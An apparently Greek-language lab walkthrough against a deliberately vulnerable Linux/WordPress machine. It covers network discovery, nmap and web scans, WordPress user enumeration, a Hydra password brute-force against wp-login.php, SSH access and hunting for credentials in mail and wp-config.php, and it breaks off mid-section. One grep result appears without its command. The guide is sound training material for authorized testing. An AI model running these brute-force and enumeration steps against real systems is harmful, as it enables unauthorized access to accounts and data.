# Εκπαιδευτικό Εργαστήριο Linux Web και Κλιμάκωσης Δικαιωμάτων

> **Μόνο για εξουσιοδοτημένο εργαστήριο.** Χρησιμοποιήστε τις εντολές αποκλειστικά σε σκόπιμα ευάλωτη εικονική μηχανή ή σε σύστημα για το οποίο έχετε ρητή άδεια. Αντικαταστήστε το `172.16.250.3` με τη διεύθυνση του δικού σας εργαστηριακού στόχου.

## Εισαγωγή

Ο οδηγός οδηγεί βήμα προς βήμα σε μια πλήρη, εξουσιοδοτημένη άσκηση δοκιμής διακομιστών εναντίον σκόπιμα ευάλωτης μηχανής Linux: από την ανακάλυψή της στο εργαστηριακό δίκτυο, στην απαρίθμηση της web εφαρμογής και τη συλλογή διαπιστευτηρίων, ως τη διάσχιση του τελικού ορίου προνομίων και την τεκμηρίωση των στοιχείων. Κάθε βήμα ακολουθεί τον ίδιο ρυθμό — η **εντολή** που πληκτρολογείτε, η **έξοδος** που παράγει, και μια σύντομη εξήγηση για το τι συνέβη και γιατί μετράει.

Οτιδήποτε μεγαλύτερο — επιπλέον παράμετροι, παγίδες, εναλλακτικές εντολές, μεθοδολογία — βρίσκεται κρυμμένο μέσα σε συμπτυσσόμενα πλαίσια, ώστε να ακολουθείτε πρώτα την κύρια ροή και να ανοίγετε τη λεπτομέρεια μόνο όταν τη θέλετε.

<details>
<summary><strong>Περισσότερα</strong> — η δομή της άσκησης και τι ακολουθεί</summary>

Η άσκηση μιμείται μια πραγματική αξιολόγηση σε δώδεκα μικρά βήματα. Οι ενότητες 1 έως 3 μένουν έξω από τον στόχο: επιβεβαιώνετε το εργαστηριακό δίκτυο, σαρώνετε για εκτεθειμένες υπηρεσίες και απαριθμείτε την ιστοσελίδα με λίστα λέξεων και δύο σαρωτές. Οι ενότητες 4 και 5 εστιάζουν στην ίδια τη web εφαρμογή — η αναγνώριση του συστήματος διαχείρισης περιεχομένου και η κατανόηση του ακριβούς τρόπου με τον οποίο η φόρμα σύνδεσης υποβάλλει τα δεδομένα, πριν γίνει οποιαδήποτε αυτοματοποιημένη δοκιμή. Οι ενότητες 6 έως 9 μεταφέρονται στη μηχανή του στόχου με έναν λογαριασμό χαμηλών προνομίων: επαληθεύετε την ταυτότητά σας, διαβάζετε τοπικό mail και web αρχεία, και εξετάζετε τη βάση δεδομένων με την οποία μιλά η εφαρμογή. Οι ενότητες 10 έως 12 κλείνουν τον κύκλο με τον έλεγχο των κανόνων `sudo` κάθε λογαριασμού, την επίδειξη του αντίκτυπου μιας λανθασμένης ρύθμισης και τον εντοπισμό των τελικών στοιχείων.

Τα παραδείγματα χρησιμοποιούν έναν στόχο με όνομα `raven.local` και τη διεύθυνση `172.16.250.3`. Η εικονική σας μηχανή μπορεί να λάβει διαφορετική διεύθυνση. Μην υποθέτετε ποτέ ότι διεύθυνση, όνομα χρήστη, κωδικός, hash ή διαδρομή αρχείου από αυτόν τον οδηγό υπάρχει εκτός του εργαστηρίου.

Ο στόχος δεν είναι να επιτεθείτε σε πραγματικό σύστημα, αλλά να κατανοήσετε πώς κάθε παρατήρηση οδηγεί στην επόμενη ελεγχόμενη δοκιμή. Η ίδια αλυσίδα επαληθευμένων παρατηρήσεων είναι αυτή που μετατρέπει ένα χαώδες αρχείο εξόδου τερματικού σε μια αξιολόγηση που μπορεί να δράσει κάποιος άλλος.

</details>

### Πώς να διαβάζετε αυτόν τον οδηγό

Κάθε βήμα εμφανίζεται με τον ίδιο τρόπο: η **εντολή** που πληκτρολογείτε, η **έξοδος** που παράγει και, στη συνέχεια, μια σύντομη επεξήγηση για το τι συνέβη και πώς να διαβάσετε το αποτέλεσμα. Για παράδειγμα:

```bash
id
```

**Έξοδος:**

```text
uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)
```

Το πλαίσιο εντολής δείχνει τι ακριβώς εκτελείτε· το πλαίσιο εξόδου δείχνει τι απάντησε το μηχάνημα. Οι παράγραφοι μετά από κάθε έξοδο εξηγούν *τι κάνει το εργαλείο* και *γιατί έχει σημασία το βήμα*, ώστε να μάθετε τη μέθοδο, όχι μόνο τη σύνταξη.

<details>
<summary><strong>Περισσότερα</strong> — οι συμβάσεις που ακολουθούν σε όλο τον οδηγό</summary>

* **Το πλαίσιο εντολής είναι αυτό που πληκτρολογείτε· το πλαίσιο εξόδου είναι αυτό που εκτυπώνει το μηχάνημα.** Τίποτα δεν εκτελείται πριν πατήσετε Enter, και μια εντολή που πετυχαίνει συχνά δεν εκτυπώνει τίποτα.
* **Ένα πλαίσιο εντολής μπορεί να περιέχει πολλές γραμμές.** Όταν πολλές εντολές ανήκουν στην ίδια ιδέα — για παράδειγμα ο έλεγχος ταυτότητας — ομαδοποιούνται· εκτελέστε τις με τη σειρά, μία κάθε φορά, και διαβάστε την έξοδο μετά από καθεμία.
* **Η έξοδος είναι ενδεικτική, όχι πανομοιότυπη.** Διευθύνσεις, εκδόσεις, process IDs, διαδρομές αρχείων και χρονοσημάνσεις διαφέρουν στο δικό σας εργαστήριο. Μετράει η δομή της εξόδου, όχι τα ακριβή ψηφία.
* **Μια γραμμή όπως η προτροπή κωδικού ανήκει στην έξοδο του προγράμματος**, όχι σε πλαίσιο εντολής — δεν την πληκτρολογείτε ποτέ, απαντάτε σε αυτή.

</details>

## 1. Επιβεβαίωση του εργαστηριακού δικτύου

Πριν από κάθε σάρωση, επιβεβαιώστε ότι η εικονική μηχανή επίθεσης και ο στόχος βρίσκονται στο ίδιο απομονωμένο δίκτυο host-only ή εκπαιδευτικό δίκτυο. Μια εντολή ανακάλυψης βοηθά να εντοπίσετε ενεργές συσκευές:

```bash
sudo netdiscover -r 172.16.250.0/24
```

**Έξοδος:**

```text
Currently scanning: 172.16.250.0/24
IP                 MAC Address        Vendor
172.16.250.3       08:00:27:AA:BB:CC  VirtualBox
```

Η έξοδος συσχετίζει μια διεύθυνση IP με τη διεύθυνση MAC ενός δικτυακού πόρτου. Επιβεβαιώστε τη διεύθυνση από την κονσόλα της πρόκλησης ή τις ρυθμίσεις του δικού σας εργαστηρίου πριν τη δοκιμάσετε — η στήλη Vendor μπορεί να υποδεικνύει μια πλατφόρμα εικονικοποίησης, αλλά δεν αποδεικνύει ποιο host είναι ο στόχος.

Προσθέστε τοπικό όνομα μόνο αν βοηθά στην ευανάγνωστη:

```bash
echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
getent hosts raven.local
```

**Έξοδος:**

```text
172.16.250.3   raven.local
```

Η πρώτη εντολή δημιουργεί μια τοπική αντιστοίχιση· δεν αλλάζει DNS ούτε τη μηχανή του στόχου. Η δεύτερη επιβεβαιώνει ότι ο τοπικός επιλυτής επιστρέφει τη ζητούμενη διεύθυνση.

<details>
<summary><strong>Περισσότερα</strong> — τι κάνουν πραγματικά η <code>netdiscover</code> και το <code>/etc/hosts</code></summary>

Η `netdiscover` στέλνει ARP αιτήματα σε όλο το υποδίκτυο και εκτυπώνει κάθε διεύθυνση που απαντά, μαζί με τη διεύθυνση MAC που απάντησε και, από το πρόθεμα κατασκευαστή της MAC, τον πιθανό κατασκευαστή του πόρτου. Το ARP λειτουργεί μόνο μέσα σε ένα μοναδικό broadcast domain — ακόμη ένας λόγος ο επιτιθέμενος και ο στόχος να μοιράζονται ένα απομονωμένο εργαστηριακό δίκτυο, και ακόμη ένας λόγος να μην τρέχετε ποτέ εντολές ανακάλυψης σε δίκτυα που δεν σας ανήκουν.

Η στήλη `Vendor` είναι ένδειξη, όχι απόδειξη: τα προθέματα VirtualBox, VMware και παρόμοια λένε ότι ο πόρτος δημιουργήθηκε από πλατφόρμα εικονικοποίησης, αλλά την ίδια πλατφόρμα μπορεί να φιλοξενεί δεκάδες μηχανές. Η αυθεντική απάντηση είναι η διεύθυνση που καταγράφεται στις ρυθμίσεις του εργαστηρίου ή στην κονσόλα της πρόκλησης.

Το `tee -a` προσαποθηκεύει την είσοδό του στο τέλος του `/etc/hosts` ενώ τυπώνει ταυτόχρονα και στην οθόνη, ώστε βλέπετε ακριβώς τι γράφτηκε. Το αρχείο αντιστοιχίζει ονόματα με διευθύνσεις τοπικά, και το λειτουργικό σύστημα το συμβουλεύεται πριν ρωτήσει DNS. Η αλλαγή επηρεάζει μόνο το δικό σας μηχάνημα — και γι' αυτό είναι ασφαλής — ενώ η `getent hosts` επιβεβαιώνει την αντιστοίχιση επιλύοντας το όνομα μέσω των κανονικών βιβλιοθηκών συστήματος.

</details>

## 2. Ανακάλυψη εκτεθειμένων υπηρεσιών

Ξεκινήστε με μια στοχευμένη σάρωση TCP:

```bash
nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
```

**Έξοδος:**

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp  open  http    Apache httpd 2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC)
```

Η `-p-` ελέγχει όλες τις TCP θύρες και όχι μόνο τις συνηθισμένες. Η `-sV` ζητά αναγνώριση υπηρεσίας και έκδοσης, ενώ η `-sC` εκτελεί τα προεπιλεγμένα scripts του Nmap. Το αποτέλεσμα δείχνει τρία πιθανά σημεία επίθεσης: SSH για απομακρυσμένη σύνδεση, HTTP για περιεχόμενο ιστοσελίδας και RPC bind για ανακάλυψη υπηρεσιών δικτύου.

<details>
<summary><strong>Περισσότερα</strong> — πώς διαβάζετε μια σάρωση σαν αξιολογητής</summary>

Οι συμβολοσειρές έκδοσης είναι ενδείξεις, όχι αυτόματη απόδειξη ευπάθειας. Το `OpenSSH 6.7p1` σας λέει τι δηλώνει η υπηρεσία· αν ισχύει συγκεκριμένο CVE εξαρτάται από το ακριβές πακέτο της διανομής και το επίπεδο patch, οπότε επαληθεύστε τα ευρήματα του εργαστηρίου με αξιόπιστες ανακοινώσεις και όχι με σύγκριση αριθμών εκδόσεων.

Η επιλογή `-oN` αποθηκεύει ανθρώπινα αναγνώσιμη αναφορά στο `nmap-raven.txt`. Η διατήρηση της εξόδου της σάρωσης είναι σημαντική γιατί παρέχει μια γραμμή βάσης και κάνει τις επόμενες σημειώσεις επαναλήψιμες — όταν κάποιος ρωτά «ποιες θύρες ήταν ανοιχτές όταν το βρήκατε;», το αρχείο είναι η απάντηση. Το `-oA prefix` γράφει και τις τρεις μορφές (κανονική, grepable και XML) με μία εντολή — η συνηθισμένη επιλογή σε πραγματικές αξιολογήσεις, γιατί το XML εισάγεται σε εργαλεία αναφορών.

Μερικές κοινωνικές συμβουλές σάρωσης: ακόμη και μια πλήρης σάρωση `-p-` ενός μόνο host διαρκεί λεπτά, και η ίδια σάρωσε σε ένα μεγάλο δίκτυο διαρκεί ώρες — ορίζετε τους στόχους σας σκόπιμα. Σε σύγχρονα δίκτυα, ισοδύναμο της `netdiscover` είναι η `arp-scan --localnet`, και ο ίδιος ο Nmap μπορεί να ανακαλύψει hosts με `-sn` πριν σαρώσετε θύρες.

</details>

## 3. Απαρίθμηση της web εφαρμογής

Ζητήστε την αρχική σελίδα και εξετάστε τις κεφαλίδες της:

```bash
curl -i http://raven.local/
```

**Έξοδος:**

```text
HTTP/1.1 200 OK
Server: Apache/2.4.10 (Debian)
Content-Type: text/html; charset=UTF-8

<html> ... </html>
```

Ο κωδικός κατάστασης δηλώνει αν το αίτημα πέτυχε, και το σώμα είναι το περιεχόμενο της σελίδας. Ελέγξτε το σώμα με τα χέρια για συνδέσμους, σχόλια, φόρμες και αναφορές σε κατάλογους εφαρμογής — από εκεί έρχεται συνήθως το επόμενο βήμα.

<details>
<summary><strong>Περισσότερα</strong> — τι μπορούν και τι δεν μπορούν να σας πουν οι κεφαλίδες απόκρισης</summary>

Η κεφαλίδα `Server` υποδεικνύει το λογισμικό web server, αν και οι κεφαλίδες μπορεί να είναι ανακριβείς ή σκόπιμα αποκρυμμένες: πολλοί διαχειριστές τις μετατρέπουν ή τις αφαιρούν, και κάποιοι servers απλώς λένε ψέματα από προεπιλογή. Αντιμετωπίστε την ως αρχική υπόθεση, όχι ως γεγονός. Η `-i` είναι η παράμετρος που κάνει το `curl` να εμφανίζει καθόλου τις κεφαλίδες — χωρίς αυτή βλέπετε μόνο το σώμα, που είναι η πιο συνηθισμένη χρήση της εντολής.

Κωδικοί κατάστασης που αξίζει να απομνημονεύσετε: το `200` σημαίνει ότι επιστράφηκε ο πόρος· τα `3xx` είναι redirects· το `403` σημαίνει ότι ο server γνωρίζει τον πόρο αλλά αρνείται να τον σερβίρει· το `404` σημαίνει ότι δηλώνει ότι δεν τον γνωρίζει καθόλου. Καθένα από αυτά είναι γεγονός για τη συμπεριφορά του server, όχι ακόμη εύρημα.

</details>

Εξετάστε συνηθισμένους καταλόγους με λίστα λέξεων:

```bash
gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Έξοδος:**

```text
/status:           200
/wordpress:        301
/server-status:    403
```

Μια απάντηση `200` κανονικά σημαίνει ότι επιστράφηκε περιεχόμενο, και ένα redirect `301` δείχνει ότι το path υπάρχει και δείχνει κάπου αλλού — συχνά σε έναν κατάλογο που χρειάζεται τελικό `/`. Το `403` σημαίνει ότι ο server αναγνώρισε τον πόρο αλλά αρνήθηκε την πρόσβαση· επιβεβαιώνει ακόμη ότι το path μπορεί να υπάρχει.

<details>
<summary><strong>Περισσότερα</strong> — λίστες λέξεων, ψεύτικα αποτελέσματα και καλή συμπεριφορά σάρωσης</summary>

Η Gobuster δοκιμάζει κάθε λέξη της λίστας και αναφέρει τις απαντήσεις που δεν είναι απλά 404· η `-x php,html,txt` προσαποθηκεύει επιπλέον επεκτάσεις αρχείου σε κάθε λέξη. Η λίστα λέξεων είναι το χειρούλι που ελέγχει ταυτόχρονα ταχύτητα και εμβέλεια: το `common.txt` είναι μικρή και γρήγορη, μεγαλύτερες λίστες βρίσκουν περισσότερα και παίρνουν περισσότερο χρόνο, και μια στοχευμένη λίστα με το λεξιλόγιο της ίδιας της εφαρμογής συχνά κερδίζει μια γενική.

Επαληθεύστε τα ενδιαφέροντα αποτελέσματα με τα χέρια αντί να θεωρείτε κάθε απάντηση εύρημα. Ένα redirect μπορεί να δείχνει σε μια σελίδα σύνδεσης που δεν αποκαλύπτει τίποτα· ένα `403` μπορεί να κρύβει περιεχόμενο που σερβίρεται αλλού. Ένα αίτημα ανά λέξη κρατά επίσης τη σάρωση σιωπηλή: σε κοινόχρηστα περιβάλλοντα, επιθετικοί ρυθμοί αιτημάτων μπορούν να επηρεάσουν τη διαθεσιμότητα και να ενεργοποιήσουν αμυντικούς μηχανισμούς όπως περιορισμοί ρυθμού ή WAF.

</details>

Μπορείτε επίσης να κάνετε έναν βασικό έλεγχο του web server:

```bash
nikto -h http://raven.local/
```

**Έξοδος:**

```text
+ Server: Apache/2.4.10 (Debian)
+ Retrieved x-powered-by header: PHP/5.6.x
+ /wordpress/: Potentially interesting directory
```

Το Nikto αναφέρει παρατηρήσεις και συνηθισμένα προβλήματα ρύθμισης, και αρκετές γραμμές του επικαλύπτονται με ό,τι έδειξαν ήδη τα προηγούμενα εργαλεία.

<details>
<summary><strong>Περισσότερα</strong> — γιατί το Nikto είναι βοήθημα, όχι κρίση</summary>

Το Nikto είναι θορυβώδες και μπορεί να παράγει ψεύτικα αποτελέσματα: στέλνει μεγάλο αριθμό αιτημάτων, πολλά από τα οποία ελέγχουν για αρχεία που πιθανότατα δεν υπάρχουν, και κάποιες «προειδοποιήσεις» του είναι πληροφοριακές και όχι ευπάθειες. Χρησιμοποιήστε το ως βοήθημα απαρίθμησης, όχι ως τελική αξιολόγηση ευπαθειών, και επιβεβαιώστε με τα χέρια κάθε ενδιαφέρουσα γραμμή.

Η γραμμή `x-powered-by: PHP/5.6.x` είναι καλό παράδειγμα γιατί η χειροκίνητη επιβεβαίωση μετράει: η κεφαλίδα δηλώνει την έκδοση του runtime, που βοηθά να ψάξετε μετά τις σωστές ανακοινώσεις, αλλά είναι απλώς μια δήλωση του server — και μια κεφαλίδα μπορεί να προστεθεί, να αλλάξει ή να αφαιρεθεί από όποιον έχει πρόσβαση στις ρυθμίσεις.

</details>

87:<!-- Training flag: FLAG{example_source_review} -->

Ο αριθμός γραμμής βοηθά να εντοπίσετε το σχετικό κείμενο, και η αντιστοίχιση είναι σχόλιο HTML. Τα σχόλια HTML αποστέλλονται στον browser ακόμη κι αν δεν εμφανίζονται στη σελίδα, οπότε δεν πρέπει ποτέ να περιέχουν ευαίσθητα δεδομένα.

<details>
<summary><strong>Περισσότερα</strong> — πώς ένα σχόλιο γίνεται στοιχείο</summary>

Το `curl -s` κατεβάζει τη σελίδα σιωπηλά — χωρίς `-s` τυπώνει μια μπάρα προόδου που θα μόλυνε το αποθηκευμένο αρχείο — και το `grep -inE` συνδυάζει τρεις χρήσιμες συμπεριφορές: η `-i` αγνοεί διάκριση πεζών/κεφαλαίων, η `-n` προθέτει σε κάθε αντιστοίχιση τον αριθμό γραμμής, και η `-E` αντιμετωπίζει το μοτίβο ως εκτεταμένη κανονική έκφραση, ώστε το `|` λειτουργεί ως «ή».

Σε πραγματική αξιολόγηση, αναφέρετε εκτεθειμένα μυστικά χωρίς να τα δημοσιεύετε περιττά: καταγράψτε πού βρέθηκε το μυστικό και τι πρόσβαση χορηγεί, αποκρύψτε την ίδια την τιμή και αφήστε τον ιδιοκτήτη να την αλλάξει. Η αντιγραφή ενός ζωντανού διαπιστευτηρίου σε δημόσια αναφορά είναι από μόνη της παραβίαση.

</details>

## 4. Αναγνώριση του συστήματος διαχείρισης περιεχομένου

Αν εμφανιστεί εγκατάσταση WordPress κάτω από το `/wordpress`, εξετάστε τη με έναν σαρωτή ρυθμισμένο για αυτή τη διαδρομή:

```bash
wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
```

**Έξοδος:**

```text
[i] WordPress version detected: 4.x
[+] URL: http://raven.local/wordpress/
[i] User(s) Identified:
    steven
    michael
```

Το αποτέλεσμα απαρίθμησης χρηστών υποδεικνύει ότι η εφαρμογή αποκαλύπτει ονόματα λογαριασμών. Δεν αποκαλύπτει κωδικούς και πρέπει να αντιμετωπίζεται ως ευαίσθητη πληροφορία.

<details>
<summary><strong>Περισσότερα</strong> — τι ζητούν οι παράμετροι και τι κάνετε με τις απαντήσεις</summary>

Η `--enumerate u` ζητά λογαριασμούς χρηστών, η `vt` ευάλωτα themes και plugins, και η `--plugins-detection passive` περιορίζει την ανακάλυψη σε αυτό που ήδη αποκαλύπτει ο ίδιος ο ιστότοπος — πιο σιωπηλή από την ενεργή δοκιμή κάθε γνωστού plugin. Τα ευρήματα έκδοσης και plugin είναι υποθέσεις που χρειάζονται επιβεβαίωση και προσεκτική σύγκριση με αξιόπιστες ανακοινώσεις ευπαθειών — μια συμβολοσειρά έκδοσης δεν αποδεικνύει από μόνη της ότι υπάρχει συγκεκριμένη ευπάθεια.

Τα αποκαλυμμένα ονόματα χρηστών (`steven`, `michael`) είναι ήδη χρήσιμα: μετατρέπουν κάθε μεταγενέστερη δοκιμή κωδικού από δίπλευρη μαντεία σε μονόπλευρη, και μπορεί να ισχύουν και σε άλλες υπηρεσίες — γι' αυτό η επαναχρησιμοποίηση κωδικών σε διαφορετικές υπηρεσίες είναι επαναλαμβανόμενο θέμα σε πραγματικές παραβιάσεις. Χρησιμοποιήστε σαρωτές μόνο σε συστήματα για τα οποία έχετε εξουσιοδότηση και αποφύγετε επιθετικούς ρυθμούς αιτημάτων σε κοινόχρηστα περιβάλλοντα, γιατί η απαρίθμηση μπορεί να επηρεάσει τη διαθεσιμότητα και να ενεργοποιήσει αμυντικούς μηχανισμούς.

</details>

## 5. Κατανόηση του αιτήματος σύνδεσης με ασφάλεια

Για μια εκπαιδευτική εφαρμογή, τα εργαλεία ανάπτυξης του browser μπορούν να δείξουν πώς μια φόρμα σύνδεσης υποβάλλει τα δεδομένα. Εξετάστε τη μέθοδο, τη διαδρομή, τα ονόματα παραμέτρων και την απάντηση αποτυχίας. Ένα γενικό αίτημα μπορεί να μοιάζει έτσι:

```text
POST /wordpress/wp-login.php
Content-Type: application/x-www-form-urlencoded

log=USER&pwd=PASSWORD&wp-submit=Log+In
```

Η σημαντική διδασκαλία είναι ότι μια αυτοματοποιημένη δοκιμή πρέπει να ταιριάζει με την πραγματική μορφή αιτήματος και την πραγματική συνθήκη αποτυχίας της εφαρμογής. Μην αντιγράφετε το αίτημα μιας εφαρμογής σε άλλη χωρίς να το επαληθεύσετε.

<details>
<summary><strong>Περισσότερα</strong> — οι κανόνες που κάνουν τη δοκιμή κωδικών υπερασπίσιμη</summary>

Κάθε αυτοματοποιημένη δοκιμή κωδικού χρειάζεται τέσσερα πράγματα γραμμένα πριν ξεκινήσει: ρητή εξουσιοδότηση, μια μικρή εγκεκριμένη λίστα λέξεων, περιορισμός ρυθμού και τεκμηριωμένη συνθήκη διακοπής — για παράδειγμα «σταματά μετά τα τρία έγκυρα αποτελέσματα» ή «σταματά στις 09:00». Χωρίς αυτά, η δοκιμή δεν ξεχωρίζει από μια επίθεση, και σε κοινόχρηστο υποδομή μπορεί να κλειδώσει πραγματικούς χρήστες ή να ενεργοποιήσει αμυντικούς μηχανισμούς που ειδοποιούν την ομάδα αμύνης.

Η χειροκίνητη ανάγνωση της φόρμας σας γλιτώνει και το πιο συχνό λάθος του αρχάριου: ένα εργαλείο που τρέχει ευχάριστα για μια ώρα και αναφέρει τίποτα, γιατί η συμβολοσειρά αποτυχίας του δεν ταιριάζει ποτέ με το πραγματικό μήνυμα λάθους της εφαρμογής. Τα tabs δικτύου των εργαλείων ανάπτυξης δείχνουν το ακριβές αίτημα που στέλνει ο browser, μαζί με τυχόν cookie ή token που εξαρτάται η φόρμα.

</details>

Για παράδειγμα, σε απομονωμένο εργαστήριο και με εξουσιοδότηση, ένα ελεγχόμενο συντακτικό Hydra μπορεί να δομηθεί ως εξής. Κρατήστε τα placeholders μέχρι να έχετε επιβεβαιώσει τα πεδία της φόρμας:

```bash
hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
'/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' \
-t 4 -f -V
```

**Έξοδος:**

```text
[80][http-post-form] host: raven.local   login: steven   password: training-password
1 valid password found
```

Τα `^USER^` και `^PASS^` είναι αντικαταστάσεις της Hydra, και η έκφραση `F=` λέει στη Hydra πώς να αναγνωρίσει μια αποτυχημένη σύνδεση. Η `-t 4` περιορίζει τις παράλληλες εργασίες και η `-f` σταματά μετά από έγκυρο αποτέλεσμα. Ένα αποτέλεσμα δεν είναι αξιόπιστο αν δεν το επαληθεύσετε χειροκίνητα μέσω του εξουσιοδοτημένου περιβάλλοντος σύνδεσης.

<details>
<summary><strong>Περισσότερα</strong> — ανάγνωση των παραμέτρων της Hydra γραμμή προς γραμμή</summary>

* Η `-l steven` δίνει ένα συγκεκριμένο όνομα χρήστη· η `-P αρχείο` δίνει μια λίστα πιθανών κωδικών, έναν ανά γραμμή. Η Hydra δοκιμάζει κάθε συνδυασμό.
* Το `http-post-form` επιλέγει τη μονάδα που μιλά αυτό το είδος αιτήματος σύνδεσης, και τα τρία μέρη που ακολουθούν χωρισμένα με διπλή τελεία είναι η διαδρομή, το σώμα POST με τα placeholders `^USER^`/`^PASS^`, και η υπογραφή αποτυχίας `F=incorrect`.
* Η `-t 4` περιορίζει τον αριθμό ταυτόχρονων προσπαθειών. Χαμηλοί αριθμοί είναι ευγενικοί και σιωπηλοί· υψηλοί προκαλούν κλειδώματα και ειδοποιήσεις.
* Η `-f` τερματίζει στην πρώτη επιτυχία και η `-V` τυπώνει κάθε προσπάθεια — χρήσιμη σε μικρό εργαστήριο, υπερβολικά αναλυτική σε μεγάλη δοκιμή.

Αν η συμβολοσειρά αποτυχίας είναι λάθος — για παράδειγμα η εφαρμογή λέει «Invalid credentials» αντί για «incorrect» — η Hydra αναφέρει κάθε κωδικό ως έγκυρο. Γι' αυτό το βήμα της χειροκίνησης επαλήθευσης δεν είναι προαιρετικό: συνδεθείτε μέσω της πραγματικής φόρμας με το βρεθέν διαπιστευτήριο και καταγράψτε την επιτυχημένη αυθεντικοποίηση.

</details>

## 6. Δοκιμή διαπιστευτηρίων SSH στο εργαστήριο

Αν σας έχει δοθεί ή έχετε εντοπίσει λογαριασμό εργαστηρίου μέσω εξουσιοδοτημένης άσκησης, δοκιμάστε τον απευθείας αντί να μαντεύετε επανειλημμένα:

```bash
ssh michael@raven.local
```

**Έξοδος:**

```text
michael@raven.local's password:
Linux raven 3.x Debian GNU/Linux
michael@raven:~$
```

Η προτροπή κελύφους δείχνει ότι η αυθεντικοποίηση πέτυχε ως `michael`. Δεν συνεπάγεται διαχειριστική πρόσβαση. Καταγράψτε το όνομα λογαριασμού και την ώρα σύνδεσης, και ξεκινήστε με χαμηλού αντίκτυπου τοπική απαρίθμηση.

Ελέγξτε την ταυτότητα και το βασικό πλαίσιο του μηχανήματος:

```bash
id
hostname
pwd
```

**Έξοδος:**

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael)
raven
/home/michael
```

Η `id` δείχνει τα αριθμητικά αναγνωριστικά χρήστη και ομάδας, η `hostname` ταυτοποιεί τη μηχανή και η `pwd` τον τρέχοντα κατάλογο. Αυτοί οι έλεγχοι αποτρέπουν τη σύγχυση όταν έχουν ανοιχτά πολλά εργαστηριακά μηχανήματα ή κέλυφη.

<details>
<summary><strong>Περισσότερα</strong> — γιατί τα πρώτα λεπτά σε ένα κέλυφος μετρούν</summary>

Η προτροπή κωδικού στην καταγραφή είναι έξοδο προγράμματος, όχι εντολή: το SSH ρωτά τον κωδικό στην απομακρυσμένη πλευρά, οπότε δεν εμφανίζεται ποτέ στο ιστορικό των εντολών σας. Η καταγραφή της ακριβούς ώρας σύνδεσης δεν είναι γραφειοκρατία — αργότερα, όταν συσχετίζετε τις δικές σας ενέργειες με τα logs του μηχανήματος, αυτή η χρονική σήμανση είναι ο τρόπος να βρείτε τις δικές σας εγγραφές.

Ξεκινήστε με εντολές χαμηλού αντίκτυπου γιατί ό,τι τρέχετε μπορεί να καταγράφεται και να ειδοποιήσει κάποιον που παρακολουθεί την κονσόλα. Οι `id`, `hostname` και `pwd` είναι σιωπηλές· μια σάρωση θυρών από μέσα στον στόχο ή μια ανεξέλεγκτη δοκιμή κωδικού δεν είναι. Η έξοδο της `id` σάς λέει επίσης σε ποιες ομάδες ανήκει ο λογαριασμός — η ιδιότητα σε ομάδες όπως `sudo`, `docker` ή `www-data` είναι συχνά η συντομότερη διαδρομή προς περισσότερα πρόνομια, και είναι ακριβώς αυτό που θα ελέγξει η `sudo -l` στην ενότητα 10.

</details>

## 7. Εξέταση τοπικού mail και web αρχείων

Εντοπίστε mail μέσω της βάσης δεδομένων του συστήματος όπου υπάρχει:

```bash
locate /var/mail 2>/dev/null
ls -la /var/mail
cat /var/mail/michael
```

**Έξοδος:**

```text
/var/mail
/var/mail/michael
From admin@raven.local ...
Subject: maintenance note
The staging application uses the same credentials as the lab account.
```

Η `locate` ψάχνει σε ευρετήριο και μπορεί να μην είναι πλήρες ή επίκαιρο, η `ls -la` εμφανίζει ιδιοκτήτες, δικαιώματα και χρονοσημάνσεις, και η `cat` τυπώνει το αρχείο. Το ίδιο το μήνυμα δείχνει πώς αρχεία που κανείς δεν κοιτάζει κουβολούν χρήσιμες λειτουργικές πληροφορίες.

<details>
<summary><strong>Περισσότερα</strong> — mail, και συμπεριφορά απέναντι σε ιδιωτικά δεδομένα</summary>

Μεγάλα μηνύματα πρέπει να αντιγράφονται και να εξετάζονται προσεκτικά αντί να χύνονται στο τερματικό — η `cat` σε αρχείο γραμματοκιβωτίου τυπώνει ό,τι περιέχει, συμπεριλαμβανομένων συνημμένων. Το σημείωμα σε αυτό το εργαστήριο διαρρέει μια ένδειξη επαναχρησιμοποίησης διαπιστευτηρίων («τα ίδια διαπιστευτήρια»), ακριβώς το είδος ευρήματος που συνδέει μια web εφαρμογή με έναν λογαριασμό κελύφους· σε πραγματική αναφορά θα παραθέσατε τη φράση, θα αποκρύπτατε το διαπιστευτήριο και θα προτείνατε να χωριστούν τα δύο.

Το mail μπορεί να περιέχει χρήσιμες λειτουργικές πληροφορίες σε εργαστήριο, ενώ σε πραγματικά περιβάλλοντα είναι ιδιωτικά δεδομένα και πρέπει να διαχειρίζεσται με ρητή εξουσιοδότηση. Το να διαβάζετε τα μηνύματα των άλλων επειδή μπορείτε δεν είναι διαδρομή κλιμάκωσης — είναι παράβαση εμβέλειας.

</details>

Εξετάστε web καταλόγους χωρίς να αλλάξετε αρχεία:

```bash
find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
```

**Έξοδος:**

```text
-rw-r--r-- www-data www-data /var/www/html/index.php
-rw-r--r-- www-data www-data /var/www/html/flag2.txt
-rw-r--r-- www-data www-data /var/www/html/wordpress/wp-config.php
```

Η έξοδος δείχνει δικαιώματα, ιδιοκτήτη, ομάδα και διαδρομή. Το `wp-config.php` είναι ιδιαίτερα σημαντικό γιατί το WordPress συνήθως αποθηκεύει εκεί τις ρυθμίσεις σύνδεσης με τη βάση δεδομένων.

<details>
<summary><strong>Περισσότερα</strong> — πώς διαβάζετε μια λίστα <code>find</code> σαν ελεγκτής</summary>

Η `-maxdepth 3` σταματά την κατάβαση σε τρία επίπεδα βάθους, κρατώντας την έξοδο ευανάγνωστη, και η `-printf` χτίζει τη λίστα από placeholders: το `%M` είναι η συμβολοσειρά δικαιωμάτων, το `%u` ο ιδιοκτήτης, το `%g` η ομάδα και το `%p` η διαδρομή. Το τελικό `2>/dev/null` κρύβει τον θόρυβο «Permission denied» από καταλόγους που ο λογαριασμός δεν μπορεί να διαβάσει, αφήνοντας μόνο τις επιτυχίες.

